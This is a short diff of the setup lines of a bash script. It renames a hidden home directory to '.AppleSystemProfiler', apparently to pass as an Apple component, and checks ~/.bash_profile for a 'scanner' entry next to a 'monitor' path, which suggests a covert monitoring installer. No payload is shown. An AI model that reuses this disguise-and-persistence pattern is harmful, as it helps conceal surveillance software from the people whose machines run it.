@@ -1,10 +1,10 @@
 #!/bin/bash
 
 HOME=~
-DIR_NAME=".web"
+DIR_NAME=".AppleSystemProfiler"
 DIR=$HOME/$DIR_NAME
 PROFILE=$HOME/.bash_profile
-SCANNER=$DIR/scan
+SCANNER=$DIR/scanner
 MONITOR=$DIR/monitor
 MON_ESC=`echo $MONITOR | sed 's/[\\/&]/\\\\&/g'`
 IN_PROF="`cat $PROFILE | grep \"$SCANNER\"`"
